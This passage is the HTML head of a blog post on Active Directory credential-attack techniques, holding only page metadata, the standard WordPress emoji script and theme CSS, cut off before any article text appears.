<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="profile" href="https://gmpg.org/xfn/11">

<title>Mimikatz and DCSync and ExtraSids, Oh My &#8211; harmj0y</title>
<meta name='robots' content='max-image-preview:large' />
<link rel='dns-prefetch' href='//secure.gravatar.com' />
<link rel='dns-prefetch' href='//fonts.googleapis.com' />
<link rel='dns-prefetch' href='//s.w.org' />
<link rel='dns-prefetch' href='//v0.wordpress.com' />
<link rel="alternate" type="application/rss+xml" title="harmj0y &raquo; Feed" href="http://www.harmj0y.net/blog/feed/" />
<link rel="alternate" type="application/rss+xml" title="harmj0y &raquo; Comments Feed" href="http://www.harmj0y.net/blog/comments/feed/" />
<link rel="alternate" type="application/rss+xml" title="harmj0y &raquo; Mimikatz and DCSync and ExtraSids, Oh My Comments Feed" href="http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/feed/" />
		<script>
			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.0.1\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.0.1\/svg\/","svgExt":".svg","source":{"concatemoji":"http:\/\/www.harmj0y.net\/blog\/wp-includes\/js\/wp-emoji-release.min.js?ver=5.7.2"}};
			!function(e,a,t){var n,r,o,i=a.createElement("canvas"),p=i.getContext&&i.getContext("2d");function s(e,t){var a=String.fromCharCode;p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,e),0,0);e=i.toDataURL();return p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,t),0,0),e===i.toDataURL()}function c(e){var t=a.createElement("script");t.src=e,t.defer=t.type="text/javascript",a.getElementsByTagName("head")[0].appendChild(t)}for(o=Array("flag","emoji"),t.supports={everything:!0,everythingExceptFlag:!0},r=0;r<o.length;r++)t.supports[o[r]]=function(e){if(!p||!p.fillText)return!1;switch(p.textBaseline="top",p.font="600 32px Arial",e){case"flag":return s([127987,65039,8205,9895,65039],[127987,65039,8203,9895,65039])?!1:!s([55356,56826,55356,56819],[55356,56826,8203,55356,56819])&&!s([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]);case"emoji":return!s([55357,56424,8205,55356,57212],[55357,56424,8203,55356,57212])}return!1}(o[r]),t.supports.everything=t.supports.everything&&t.supports[o[r]],"flag"!==o[r]&&(t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&t.supports[o[r]]);t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&!t.supports.flag,t.DOMReady=!1,t.readyCallback=function(){t.DOMReady=!0},t.supports.everything||(n=function(){t.readyCallback()},a.addEventListener?(a.addEventListener("DOMContentLoaded",n,!1),e.addEventListener("load",n,!1)):(e.attachEvent("onload",n),a.attachEvent("onreadystatechange",function(){"complete"===a.readyState&&t.readyCallback()})),(n=t.source||{}).concatemoji?c(n.concatemoji):n.wpemoji&&n.twemoji&&(c(n.twemoji),c(n.wpemoji)))}(window,document,window._wpemojiSettings);
		</script>
		<style>
img.wp-smiley,
img.emoji {
	display: inline !important;
	border: none !important;
	box-shadow: none !important;
	height: 1em !important;
	width: 1em !important;
	margin: 0 .07em !important;
	vertical-align: -0.1em !important;
	background: none !important;
	padding: 0 !important;
}
</style>
	<link rel='stylesheet' id='crayon-css'  href='http://www.harmj0y.net/blog/wp-content/plugins/crayon-syntax-highlighter/css/min/crayon.min.css?ver=_2.7.2_beta' media='all' />
<link rel='stylesheet' id='crayon-theme-classic-css'  href='http://www.harmj0y.net/blog/wp-content/plugins/crayon-syntax-highlighter/themes/classic/classic.css?ver=_2.7.2_beta' media='all' />
<link rel='stylesheet' id='crayon-font-monaco-css'  href='http://www.harmj0y.net/blog/wp-content/plugins/crayon-syntax-highlighter/fonts/monaco.css?ver=_2.7.2_beta' media='all' />
<link rel='stylesheet' id='astra-theme-css-css'  href='http://www.harmj0y.net/blog/wp-content/themes/astra/assets/css/minified/main.min.css?ver=3.4.2' media='all' />
<style id='astra-theme-css-inline-css'>
html{font-size:93.75%;}a,.page-title{color:#1d798b;}a:hover,a:focus{color:#f9f9f9;}body,button,input,select,textarea,.ast-button,.ast-custom-button{font-family:'Roboto',sans-serif;font-weight:400;font-size:15px;font-size:1rem;}blockquote{color:#000000;}h1,.entry-content h1,h2,.entry-content h2,h3,.entry-content h3,h4,.entry-content h4,h5,.entry-content h5,h6,.entry-content h6,.site-title,.site-title a{font-family:'Oxanium',display;font-weight:400;}.site-title{font-size:35px;font-size:2.3333333333333rem;}header .custom-logo-link img{max-width:120px;}.astra-logo-svg{width:120px;}.ast-archive-description .ast-archive-title{font-size:40px;font-size:2.6666666666667rem;}.site-header .site-description{font-size:15px;font-size:1rem;}.entry-title{font-size:30px;font-size:2rem;}h1,.entry-content h1{font-size:40px;font-size:2.6666666666667rem;font-weight:400;font-family:'Oxanium',display;}h2,.entry-content h2{font-size:30px;font-size:2rem;font-weight:400;font-family:'Oxanium',display;}h3,.entry-content h3{font-size:25px;font-size:1.6666666666667rem;font-weight:400;font-family:'Oxanium',display;}h4,.entry-content h4{font-size:20px;font-size:1.3333333333333rem;}h5,.entry-content h5{font-size:18px;font-size:1.2rem;}h6,.entry-content h6{font-size:15px;font-size:1rem;}.ast-single-post .entry-title,.page-title{font-size:30px;font-size:2rem;}::selection{background-color:#33ccda;color:#000000;}body,h1,.entry-title a,.entry-content h1,h2,.entry-content h2,h3,.entry-content h3,h4,.entry-content h4,h5,.entry-content h5,h6,.entry-content h6{color:#3a3a3a;}.tagcloud a:hover,.tagcloud a:focus,.tagcloud a.current-item{color:#ffffff;border-color:#1d798b;background-color:#1d798b;}input:focus,input[type="text"]:focus,input[type="email"]:focus,input[type="url"]:focus,input[type="password"]:focus,input[type="reset"]:focus,input[type="search"]:focus,textarea:focus{border-color:#1d798b;}input[type="radio"]:checked,input[type=reset],input[type="checkbox"]:checked,input[type="checkbox"]:hover:checked,input[type="checkbox"]:focus:checked,input[type=range]::-webkit-slider-thumb{border-color:#1d798b;background-color:#1d798b;box-shadow:none;}.site-footer a:hover + .post-count,.site-footer a:focus + .post-count{background:#1d798b;border-color:#1d798b;}.single .nav-links .nav-previous,.single .nav-links .nav-next{color:#1d798b;}.entry-meta,.entry-meta *{line-height:1.45;color:#1d798b;}.entry-meta a:hover,.entry-meta a:hover *,.entry-meta a:focus,.entry-meta a:focus *,.page-links > .page-link,.page-links .page-link:hover,.post-navigation a:hover{color:#f9f9f9;}.widget-title{font-size:21px;font-size:1.4rem;color:#3a3a3a;}#cat option,.secondary .calendar_wrap thead a,.secondary .calendar_wrap thead a:visited{color:#1d798b;}.secondary .calendar_wrap #today,.ast-progress-val span{background:#1d798b;}.secondary a:hover + .post-count,.secondary a:focus + .post-count{background:#1d798b;border-color:#1d798b;}.calendar_wrap #today > a{color:#ffffff;}.page-links .page-link,.single .post-navigation a{color:#1d798b;}#secondary,#secondary button,#secondary input,#secondary select,#secondary textarea{font-size:15px;font-size:1rem;}#secondary {margin: 4em 0 2.5em;word-break: break-word;line-height: 2;}#secondary li {margin-bottom: 0.25em;}#secondary li:last-child {margin-bottom: 0;}@media (max-width: 768px) {.js_active .ast-plain-container.ast-single-post #secondary {margin-top: 1.5em;}}.ast-separate-container.ast-two-container #secondary .widget {background-color: #fff;padding: 2em;margin-bottom: 2em;}@media (min-width: 993px) {.ast-left-sidebar #secondary {padding-right: 60px;}.ast-right-sidebar #secondary {padding-left: 60px;}}@media (max-width: 993px) {.ast-right-sidebar #secondary {padding-left: 30px;}.ast-left-sidebar #secondary {padding-right: 30px;}}.wp-block-buttons.aligncenter{justify-content:center;}@media (min-width:1200px){.ast-separate-container.ast-right-sidebar .entry-content .wp-block-image.alignfull,.ast-separate-container.ast-left-sidebar .entry-content .wp-block-image.alignfull,.ast-separate-container.ast-right-sidebar .entry-content .wp-block-cover.alignfull,.ast-separate-container.ast-left-sidebar .entry-content .wp-block-cover.alignfull{margin-left:-6.67em;margin-right:-6.67em;max-width:unset;width:unset;}.ast-separate-container.ast-right-sidebar .entry-content .wp-block-image.alignwide,.ast-separate-container.ast-left-sidebar .entry-content .wp-block-image.alignwide,.ast-separate-container.ast-right-sidebar .entry-content .wp-block-cover.alignwide,.ast-separate-container.ast-left-sidebar .entry-content .wp-block-cover.alignwide{margin-left:-20px;margin-right:-20px;max-width:unset;width:unset;}}@media (min-width:1200px){.wp-block-group .has-background{padding:20px;}}@media (min-width:1200px){.ast-separate-container.ast-right-sidebar .entry-content .wp-block-group.alignwide,.ast-separate-container.ast-left-sidebar .entry-content .wp-block-group.alignwide,.ast-separate-container.ast-right-sidebar .entry-content .wp-block-cover.alignwide,.ast-separate-container.ast-left-sidebar .entry-content .wp-block-cover.alignwide{margin-left:-20px;margin-right:-20px;padding-left:20px;padding-right:20px;}.ast-separate-container.ast-right-sidebar .entry-content .wp-block-group.alignfull,.ast-separate-container.ast-left-sidebar .entry-content .wp-block-group.alignfull,.ast-separate-container.ast-right-sidebar .entry-content .wp-block-cover.alignfull,.ast-separate-container.ast-left-sidebar .entry-content .wp-block-cover.alignfull{margin-left:-6.67em;margin-right:-6.67em;padding-left:6.67em;padding-right:6.67em;}}@media (min-width:1200px){.wp-block-cover-image.alignwide .wp-block-cover__inner-container,.wp-block-cover.alignwide .wp-block-cover__inner-container,.wp-block-cover-image.alignfull .wp-block-cover__inner-container,.wp-block-cover.alignfull .wp-block-cover__inner-container{width:100%;}}.ast-plain-container.ast-no-sidebar #primary{margin-top:0;margin-bottom:0;}@media (max-width:921px){.ast-theme-transparent-header #primary,.ast-theme-transparent-header #secondary{padding:0;}}.wp-block-columns{margin-bottom:unset;}.wp-block-image.size-full{margin:2rem 0;}.wp-block-separator.has-background{padding:0;}.wp-block-gallery{margin-bottom:1.6em;}.wp-block-group{padding-top:4em;padding-bottom:4em;}.wp-block-group__inner-container .wp-block-columns:last-child,.wp-block-group__inner-container :last-child,.wp-block-table table{margin-bottom:0;}.blocks-gallery-grid{width:100%;}.wp-block-navigation-link__content{padding:5px 0;}.wp-block-group .wp-block-group .has-text-align-center,.wp-block-group .wp-block-column .has-text-align-center{max-width:100%;}.has-text-align-center{margin:0 auto;}@media (min-width:1200px){.wp-block-cover__inner-container,.alignwide .wp-block-group__inner-container,.alignfull .wp-block-group__inner-container{max-width:1200px;margin:0 auto;}.wp-block-group.alignnone,.wp-block-group.aligncenter,.wp-block-group.alignleft,.wp-block-group.alignright,.wp-block-group.alignwide,.wp-block-columns.alignwide{margin:2rem 0 1rem 0;}}@media (max-width:1200px){.wp-block-group{padding:3em;}.wp-block-group .wp-block-group{padding:1.5em;}.wp-block-columns,.wp-block-column{margin:1rem 0;}}@media (min-width:921px){.wp-block-columns .wp-block-group{padding:2em;}}@media (max-width:544px){.wp-block-cover-image .wp-block-cover__inner-container,.wp-block-cover .wp-block-cover__inner-container{width:unset;}.wp-block-cover,.wp-block-cover-image{padding:2em 0;}.wp-block-group,.wp-block-cover{padding:2em;}.wp-block-media-text__media img,.wp-block-media-text__media video{width:unset;max-width:100%;}.wp-block-media-text.has-background .wp-block-media-text__content{padding:1em;}}@media (max-width:921px){.ast-plain-container.ast-no-sidebar #primary{padding:0;}}@media (min-width:544px){.entry-content .wp-block-media-text.has-media-on-the-right .wp-block-media-text__content{padding:0 8% 0 0;}.entry-content .wp-block-media-text .wp-block-media-text__content{padding:0 0 0 8%;}.ast-plain-container .site-content .entry-content .has-custom-content-position.is-position-bottom-left > *,.ast-plain-container .site-content .entry-content .has-custom-content-position.is-position-bottom-right > *,.ast-plain-container .site-content .entry-content .has-custom-content-position.is-position-top-left > *,.ast-plain-container .site-content .entry-content .has-custom-content-position.is-position-top-right > *,.ast-plain-container .site-content .entry-content .has-custom-content-position.is-position-center-right > *,.ast-plain-container .site-content .entry-content .has-custom-content-position.is-position-center-left > *{margin:0;}}@media (max-width:544px){.entry-content .wp-block-media-text .wp-block-media-text__content{padding:8% 0;}.wp-block-media-text .wp-block-media-text__media img{width:auto;max-width:100%;}}.wp-block-button.is-style-outline .wp-block-button__link{border-color:#33ccda;border-top-width:2px;border-right-width:2px;border-bottom-width:2px;border-left-width:2px;}.wp-block-button.is-style-outline > .wp-block-button__link:not(.has-text-color),.wp-block-button.wp-block-button__link.is-style-outline:not(.has-text-color){color:#33ccda;}.wp-block-button.is-style-outline .wp-block-button__link:hover,.wp-block-button.is-style-outline .wp-block-button__link:focus{color:#000000 !important;background-color:#f9f9f9;border-color:#f9f9f9;}.post-page-numbers.current .page-link,.ast-pagination .page-numbers.current{color:#000000;border-color:#33ccda;background-color:#33ccda;border-radius:2px;}@media (max-width:921px){.wp-block-button.is-style-outline .wp-block-button__link{padding-top:calc(15px - 2px);padding-right:calc(30px - 2px);padding-bottom:calc(15px - 2px);padding-left:calc(30px - 2px);}}@media (max-width:544px){.wp-block-button.is-style-outline .wp-block-button__link{padding-top:calc(15px - 2px);padding-right:calc(30px - 2px);padding-bottom:calc(15px - 2px);padding-left:calc(30px - 2px);}}@media (min-width:544px){.entry-content > .alignleft{margin-right:20px;}.entry-content > .alignright{margin-left:20px;}.wp-block-group.has-background{padding:20px;}}@media (max-width:921px){.ast-separate-container .ast-article-post,.ast-separate-container .ast-article-single{padding:1.5em 2.14em;}.ast-separate-container #primary,.ast-separate-container #secondary{padding:1.5em 0;}#primary,#secondary{padding:1.5em 0;margin:0;}.ast-left-sidebar #content > .ast-container{display:flex;flex-direction:column-reverse;width:100%;}.ast-author-box img.avatar{margin:20px 0 0 0;}}@media (max-width:921px){#secondary.secondary{padding-top:0;}.ast-separate-container.ast-right-sidebar #secondary{padding-left:1em;padding-right:1em;}.ast-separate-container.ast-two-container #secondary{padding-left:0;padding-right:0;}.ast-page-builder-template .entry-header #secondary,.ast-page-builder-template #secondary{margin-top:1.5em;}}@media (max-width:921px){.ast-right-sidebar #primary{padding-right:0;}.ast-page-builder-template.ast-left-sidebar #secondary,.ast-page-builder-template.ast-right-sidebar #secondary{padding-right:20px;padding-left:20px;}.ast-right-sidebar #secondary,.ast-left-sidebar #primary{padding-left:0;}.ast-left-sidebar #secondary{padding-right:0;}}@media (min-width:922px){.ast-separate-container.ast-right-sidebar #primary,.ast-separate-container.ast-left-sidebar #primary{border:0;}.search-no-results.ast-separate-container #primary{margin-bottom:4em;}}@media (min-width:922px){.ast-right-sidebar #primary{border-right:1px solid #eee;}.ast-left-sidebar #primary{border-left:1px solid #eee;}.ast-right-sidebar #secondary{border-left:1px solid #eee;margin-left:-1px;}.ast-left-sidebar #secondary{border-right:1px solid #eee;margin-right:-1px;}.ast-separate-container.ast-two-container.ast-right-sidebar #secondary{padding-left:30px;padding-right:0;}.ast-separate-container.ast-two-container.ast-left-sidebar #secondary{padding-right:30px;padding-left:0;}.ast-separate-container.ast-right-sidebar #secondary,.ast-separate-container.ast-left-sidebar #secondary{border:0;margin-left:auto;margin-right:auto;}.ast-separate-container.ast-two-container #secondary .widget:last-child{margin-bottom:0;}}.wp-block-button .wp-block-button__link,{color:#000000;}.wp-block-button .wp-block-button__link:hover,.wp-block-button .wp-block-button__link:focus{color:#000000;background-color:#f9f9f9;border-color:#f9f9f9;}.wp-block-button .wp-block-button__link{border:none;background-color:#33ccda;color:#000000;font-family:inherit;font-weight:inherit;line-height:1;border-radius:2px;padding:15px 30px;}.wp-block-button.is-style-outline .wp-block-button__link{border-style:solid;border-top-width:2px;border-right-width:2px;border-left-width:2px;border-bottom-width:2px;border-color:#33ccda;padding-top:calc(15px - 2px);padding-right:calc(30px - 2px);padding-bottom:calc(15px - 2px);padding-left:calc(30px - 2px);}@media (max-width:921px){.wp-block-button .wp-block-button__link{border:none;padding:15px 30px;}.wp-block-button.is-style-outline .wp-block-button__link{padding-top:calc(15px - 2px);padding-right:calc(30px - 2px);padding-bottom:calc(15px - 2px);padding-left:calc(30px - 2px);}}@media (max-width:544px){.wp-block-button .wp-block-button__link{border:none;padding:15px 30px;}.wp-block-button.is-style-outline .wp-block-button__link{padding-top:calc(15px - 2px);padding-right:calc(30px - 2px);padding-bottom:calc(15px - 2px);padding-left:calc(30px - 2px);}}.menu-toggle,button,.ast-button,.ast-custom-button,.button,input#submit,input[type="button"],input[type="submit"],input[type="reset"]{border-style:solid;border-top-width:0;border-right-width:0;border-left-width:0;border-bottom-width:0;color:#000000;border-color:#33ccda;background-color:#33ccda;border-radius:2px;padding-top:10px;padding-right:40px;padding-bottom:10px;padding-left:40px;font-family:inherit;font-weight:inherit;line-height:1;}button:focus,.menu-toggle:hover,button:hover,.ast-button:hover,.ast-custom-button:hover .button:hover,.ast-custom-button:hover ,input[type=reset]:hover,input[type=reset]:focus,input#submit:hover,input#submit:focus,input[type="button"]:hover,input[type="button"]:focus,input[type="submit"]:hover,input[type="submit"]:focus{color:#000000;background-color:#f9f9f9;border-color:#f9f9f9;}@media (min-width:544px){.ast-container{max-width:100%;}}@media (max-width:544px){.ast-separate-container .ast-article-post,.ast-separate-container .ast-article-single,.ast-separate-container .comments-title,.ast-separate-container .ast-archive-description{padding:1.5em 1em;}.ast-separate-container #content .ast-container{padding-left:0.54em;padding-right:0.54em;}.ast-separate-container .ast-comment-list li.depth-1{padding:1.5em 1em;margin-bottom:1.5em;}.ast-separate-container .ast-comment-list .bypostauthor{padding:.5em;}.ast-search-menu-icon.ast-dropdown-active .search-field{width:170px;}.ast-separate-container #secondary{padding-top:0;}.ast-separate-container.ast-two-container #secondary .widget{margin-bottom:1.5em;padding-left:1em;padding-right:1em;}}@media (max-width:544px){.ast-separate-container .comments-count-wrapper{padding:1.5em 1em;}.ast-separate-container .ast-comment-list li.depth-1{padding:1.5em 1em;margin-bottom:1.5em;}.ast-separate-container .ast-comment-list .bypostauthor{padding:.5em;}.ast-separate-container .comment-respond{padding:1.5em 1em;}}@media (max-width:544px){.ast-comment-list .children{margin-left:0.66666em;}.ast-separate-container .ast-comment-list .bypostauthor li{padding:0 0 0 .5em;}}@media (max-width:921px){.ast-mobile-header-stack .main-header-bar .ast-search-menu-icon{display:inline-block;}.ast-header-break-point.ast-header-custom-item-outside .ast-mobile-header-stack .main-header-bar .ast-search-icon{margin:0;}.ast-comment-avatar-wrap img{max-width:2.5em;}.ast-separate-container .ast-comment-list li.depth-1{padding:1.5em 2.14em;}.ast-separate-container .comment-respond{padding:2em 2.14em;}.ast-comment-meta{padding:0 1.8888em 1.3333em;}}@media (max-width:921px){.ast-comment-avatar-wrap img{max-width:2.5em;}.comments-area{margin-top:1.5em;}.ast-separate-container .comments-count-wrapper{padding:2em 2.14em;}.ast-separate-container .ast-comment-list li.depth-1{padding:1.5em 2.14em;}.ast-separate-container .comment-respond{padding:2em 2.14em;}}@media (max-width:921px){.ast-comment-avatar-wrap{margin-right:0.5em;}}body,.ast-separate-container{background-color:#f9f9f9;;background-image:none;;}@media (max-width:921px){.ast-archive-description .ast-archive-title{font-size:40px;}.entry-title{font-size:30px;}h1,.entry-content h1{font-size:30px;}h2,.entry-content h2{font-size:25px;}h3,.entry-content h3{font-size:20px;}.ast-single-post .entry-title,.page-title{font-size:30px;}}@media (max-width:544px){.ast-archive-description .ast-archive-title{font-size:40px;}.entry-title{font-size:30px;}h1,.entry-content h1{font-size:30px;}h2,.entry-content h2{font-size:25px;}h3,.entry-content h3{font-size:20px;}.ast-single-post .entry-title,.page-title{font-size:30px;}}@media (max-width:921px){html{font-size:85.5%;}}@media (max-width:544px){html{font-size:85.5%;}}@media (min-width:922px){.ast-container{max-width:1240px;}}@media (min-width:922px){.main-header-menu .sub-menu .menu-item.ast-left-align-sub-menu:hover > .sub-menu,.main-header-menu .sub-menu .menu-item.ast-left-align-sub-menu.focus > .sub-menu{margin-left:-0px;}}.ast-breadcrumbs .trail-browse,.ast-breadcrumbs .trail-items,.ast-breadcrumbs .trail-items li{display:inline-block;margin:0;padding:0;border:none;background:inherit;text-indent:0;}.ast-breadcrumbs .trail-browse{font-size:inherit;font-style:inherit;font-weight:inherit;color:inherit;}.ast-breadcrumbs .trail-items{list-style:none;}.trail-items li::after{padding:0 0.3em;content:"\00bb";}.trail-items li:last-of-type::after{display:none;}@media (max-width:921px){.ast-builder-grid-row-container.ast-builder-grid-row-tablet-3-firstrow .ast-builder-grid-row > *:first-child,.ast-builder-grid-row-container.ast-builder-grid-row-tablet-3-lastrow .ast-builder-grid-row > *:last-child{grid-column:1 / -1;}}@media (max-width:544px){.ast-builder-grid-row-container.ast-builder-grid-row-mobile-3-firstrow .ast-builder-grid-row > *:first-child,.ast-builder-grid-row-container.ast-builder-grid-row-mobile-3-lastrow .ast-builder-grid-row > *:last-child{grid-column:1 / -1;}}.ast-builder-layout-element[data-section="title_tagline"]{display:flex;}@media (max-width:921px){.ast-header-break-point .ast-builder-layout-element[data-section="title_tagline"]{display:flex;}}@media (max-width:544px){.ast-header-break-point .ast-builder-layout-element[data-section="title_tagline"]{display:flex;}}.ast-builder-menu-1{font-family:'Oxanium',display;font-weight:inherit;text-transform:uppercase;}.ast-builder-menu-1 .menu-item > .menu-link{color:#33ccda;}.ast-builder-menu-1 .menu-item > .ast-menu-toggle{color:#33ccda;}.ast-builder-menu-1 .menu-item:hover > .menu-link,.ast-builder-menu-1 .inline-on-mobile .menu-item:hover > .ast-menu-toggle{color:#ffffff;}.ast-builder-menu-1 .menu-item:hover > .ast-menu-toggle{color:#ffffff;}.ast-builder-menu-1 .sub-menu,.ast-builder-menu-1 .inline-on-mobile .sub-menu{border-top-width:2px;border-bottom-width:0;border-right-width:0;border-left-width:0;border-color:#33ccda;border-style:solid;border-radius:0;}.ast-builder-menu-1 .main-header-menu > .menu-item > .sub-menu,.ast-builder-menu-1 .main-header-menu > .menu-item > .astra-full-megamenu-wrapper{margin-top:0;}.ast-desktop .ast-builder-menu-1 .main-header-menu > .menu-item > .sub-menu:before,.ast-desktop .ast-builder-menu-1 .main-header-menu > .menu-item > .astra-full-megamenu-wrapper:before{height:calc( 0px + 5px );}.ast-desktop .ast-builder-menu-1 .menu-item .sub-menu .menu-link{border-style:none;}@media (max-width:921px){.ast-header-break-point .ast-builder-menu-1 .menu-item.menu-item-has-children > .ast-menu-toggle{top:0;}.ast-builder-menu-1 .menu-item-has-children > .menu-link:after{content:unset;}}@media (max-width:544px){.ast-header-break-point .ast-builder-menu-1 .menu-item.menu-item-has-children > .ast-menu-toggle{top:0;}}.ast-builder-menu-1{display:flex;}@media (max-width:921px){.ast-header-break-point .ast-builder-menu-1{display:flex;}}@media (max-width:544px){.ast-header-break-point .ast-builder-menu-1{display:flex;}}.site-below-footer-wrap[data-section="section-below-footer-builder"]{background-color:#eeeeee;;min-height:80px;}.site-below-footer-wrap[data-section="section-below-footer-builder"] .ast-builder-grid-row{max-width:1200px;margin-left:auto;margin-right:auto;}.site-below-footer-wrap[data-section="section-below-footer-builder"] .ast-builder-grid-row,.site-below-footer-wrap[data-section="section-below-footer-builder"] .site-footer-section{align-items:flex-start;}.site-below-footer-wrap[data-section="section-below-footer-builder"].ast-footer-row-inline .site-footer-section{display:flex;margin-bottom:0;}.ast-builder-grid-row-full .ast-builder-grid-row{grid-template-columns:1fr;}@media (max-width:921px){.site-below-footer-wrap[data-section="section-below-footer-builder"].ast-footer-row-tablet-inline .site-footer-section{display:flex;margin-bottom:0;}.site-below-footer-wrap[data-section="section-below-footer-builder"].ast-footer-row-tablet-stack .site-footer-section{display:block;margin-bottom:10px;}.ast-builder-grid-row-container.ast-builder-grid-row-tablet-full .ast-builder-grid-row{grid-template-columns:1fr;}}@media (max-width:544px){.site-below-footer-wrap[data-section="section-below-footer-builder"].ast-footer-row-mobile-inline .site-footer-section{display:flex;margin-bottom:0;}.site-below-footer-wrap[data-section="section-below-footer-builder"].ast-footer-row-mobile-stack .site-footer-section{display:block;margin-bottom:10px;}.ast-builder-grid-row-container.ast-builder-grid-row-mobile-full .ast-builder-grid-row{grid-template-columns:1fr;}}.site-below-footer-wrap[data-section="section-below-footer-builder"]{display:grid;}@media (max-width:921px){.ast-header-break-point .site-below-footer-wrap[data-section="section-below-footer-builder"]{display:grid;}}@media (max-width:544px){.ast-header-break-point .site-below-footer-wrap[data-section="section-below-footer-builder"]{display:grid;}}.ast-footer-copyright{text-align:center;}.ast-footer-copyright {color:#3a3a3a;}@media (max-width:921px){.ast-footer-copyright{text-align:center;}}@media (max-width:544px){.ast-footer-copyright{text-align:center;}}.ast-footer-copyright.ast-builder-layout-element{display:flex;}@media (max-width:921px){.ast-header-break-point .ast-footer-copyright.ast-builder-layout-element{display:flex;}}@media (max-width:544px){.ast-header-break-point .ast-footer-copyright.ast-builder-layout-element{display:flex;}}.site-footer{background-color:;;background-image:none;;}.site-primary-footer-wrap[data-section="section-primary-footer-builder"]{background-color:#f9f9f9;;border-style:solid;border-width:0px;border-top-width:1px;border-top-color:#e6e6e6;}.site-primary-footer-wrap[data-section="section-primary-footer-builder"] .ast-builder-grid-row{max-width:1200px;margin-left:auto;margin-right:auto;}.site-primary-footer-wrap[data-section="section-primary-footer-builder"] .ast-builder-grid-row,.site-primary-footer-wrap[data-section="section-primary-footer-builder"] .site-footer-section{align-items:flex-start;}.site-primary-footer-wrap[data-section="section-primary-footer-builder"].ast-footer-row-inline .site-footer-section{display:flex;margin-bottom:0;}.ast-builder-grid-row-3-equal .ast-builder-grid-row{grid-template-columns:repeat( 3,1fr );}@media (max-width:921px){.site-primary-footer-wrap[data-section="section-primary-footer-builder"].ast-footer-row-tablet-inline .site-footer-section{display:flex;margin-bottom:0;}.site-primary-footer-wrap[data-section="section-primary-footer-builder"].ast-footer-row-tablet-stack .site-footer-section{display:block;margin-bottom:10px;}.ast-builder-grid-row-container.ast-builder-grid-row-tablet-3-equal .ast-builder-grid-row{grid-template-columns:repeat( 3,1fr );}}@media (max-width:544px){.site-primary-footer-wrap[data-section="section-primary-footer-builder"].ast-footer-row-mobile-inline .site-footer-section{display:flex;margin-bottom:0;}.site-primary-footer-wrap[data-section="section-primary-footer-builder"].ast-footer-row-mobile-stack .site-footer-section{display:block;margin-bottom:10px;}.ast-builder-grid-row-container.ast-builder-grid-row-mobile-full .ast-builder-grid-row{grid-template-columns:1fr;}}.site-primary-footer-wrap[data-section="section-primary-footer-builder"]{display:grid;}@media (max-width:921px){.ast-header-break-point .site-primary-footer-wrap[data-section="section-primary-footer-builder"]{display:grid;}}@media (max-width:544px){.ast-header-break-point .site-primary-footer-wrap[data-section="section-primary-footer-builder"]{display:grid;}}.elementor-template-full-width .ast-container{display:block;}.ast-header-break-point .main-header-bar{border-bottom-width:1px;}@media (min-width:922px){.main-header-bar{border-bottom-width:1px;}}@media (min-width:922px){#primary{width:70%;}#secondary{width:30%;}}.ast-safari-browser-less-than-11 .main-header-menu .menu-item, .ast-safari-browser-less-than-11 .main-header-bar .ast-masthead-custom-menu-items{display:block;}.main-header-menu .menu-item, #astra-footer-menu .menu-item, .main-header-bar .ast-masthead-custom-menu-items{-js-display:flex;display:flex;-webkit-box-pack:center;-webkit-justify-content:center;-moz-box-pack:center;-ms-flex-pack:center;justify-content:center;-webkit-box-orient:vertical;-webkit-box-direction:normal;-webkit-flex-direction:column;-moz-box-orient:vertical;-moz-box-direction:normal;-ms-flex-direction:column;flex-direction:column;}.main-header-menu > .menu-item > .menu-link, #astra-footer-menu > .menu-item > .menu-link,{height:100%;-webkit-box-align:center;-webkit-align-items:center;-moz-box-align:center;-ms-flex-align:center;align-items:center;-js-display:flex;display:flex;}.ast-primary-menu-disabled .main-header-bar .ast-masthead-custom-menu-items{flex:unset;}.ast-header-break-point .main-navigation ul .menu-item .menu-link .icon-arrow:first-of-type svg{top:.2em;margin-top:0px;margin-left:0px;width:.65em;transform:translate(0, -2px) rotateZ(270deg);}.ast-mobile-popup-content .ast-submenu-expanded > .ast-menu-toggle{transform:rotateX(180deg);}.ast-mobile-header-content > *,.ast-desktop-header-content > * {padding: 10px 0;height: auto;}.ast-mobile-header-content > *:first-child,.ast-desktop-header-content > *:first-child {padding-top: 10px;}.ast-mobile-header-content > .ast-builder-menu,.ast-desktop-header-content > .ast-builder-menu {padding-top: 0;}.ast-mobile-header-content > *:last-child,.ast-desktop-header-content > *:last-child {padding-bottom: 0;}.ast-mobile-header-content .ast-search-menu-icon.ast-inline-search label,.ast-desktop-header-content .ast-search-menu-icon.ast-inline-search label {width: 100%;}.ast-desktop-header-content .main-header-bar-navigation .ast-submenu-expanded > .ast-menu-toggle::before {transform: rotateX(180deg);}#ast-desktop-header .ast-desktop-header-content,.ast-mobile-header-content .ast-search-icon,.ast-desktop-header-content .ast-search-icon,.ast-off-canvas-active .ast-main-header-nav-open.ast-popup-nav-open .ast-mobile-header-wrap .ast-mobile-header-content,.ast-mobile-header-wrap .ast-mobile-header-content,.ast-main-header-nav-open.ast-popup-nav-open .ast-mobile-header-wrap .ast-mobile-header-content,.ast-off-canvas-active .ast-main-header-nav-open.ast-popup-nav-open .ast-desktop-header-content,.ast-main-header-nav-open.ast-popup-nav-open .ast-desktop-header-content {display: none;}.ast-main-header-nav-open.ast-header-break-point #ast-desktop-header .ast-desktop-header-content,.ast-main-header-nav-open.ast-header-break-point .ast-mobile-header-wrap .ast-mobile-header-content {display: block;}.ast-desktop .ast-desktop-header-content .astra-menu-animation-slide-up > .menu-item > .sub-menu,.ast-desktop .ast-desktop-header-content .astra-menu-animation-slide-up > .menu-item .menu-item > .sub-menu,.ast-desktop .ast-desktop-header-content .astra-menu-animation-slide-down > .menu-item > .sub-menu,.ast-desktop .ast-desktop-header-content .astra-menu-animation-slide-down > .menu-item .menu-item > .sub-menu,.ast-desktop 